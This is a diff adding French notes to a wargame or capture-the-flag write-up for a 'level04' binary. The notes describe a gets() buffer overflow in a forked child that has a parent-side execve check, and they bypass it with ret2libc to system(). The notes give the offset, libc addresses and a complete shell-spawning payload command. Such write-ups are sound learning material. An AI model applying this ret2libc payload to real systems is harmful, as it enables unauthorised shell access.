@@ -1,4 +1,19 @@
+-- level04 --
+Ce programme réalise un fork() et demande une entrée utilisateur dans le processus enfant
 Pour suivre le process enfant: set follow-fork-mode child
-Trouver /bin/sh sur la stack:
+L'input est récupéré avec un gets(s) non protégé, donc exploitable.
+Il y a cependant une protection, le processus parent inspecte les registres du processus enfant
+et vérifie que son registre eax ne contient pas 11, ce qui serait le cas lors d'un appel système
+à exceve(). Executer un shellcode avec execve() va donc être compliqué. A la place, on peut
+effectuer un ret2libc vers system().
+En breakant dans le main, on trouve qu'eip est sauvegardé à 156 bytes du buffer dans lequel
+est placé l'entrée utilisateur.
+On trouve l'adresse de system() avec p system: 0xf7e6aed0
+Pour trouver /bin/sh sur la stack:
 find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+On va donc écrire 156 bytes pour remplir le buffer jusqu'à la sauvegarde d'eip, puis l'adresse de system(),
+puis son adresse de retour (exit() pour être propre ou n'importe quoi pour crash), puis l'adresse de "/bin/sh".
+Adresse d'exit: 0xf7e5eb70
+En gardant stdin ouvert:
 cat <(python -c 'print "A"*156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]') - | ./level04 "/bin/sh"
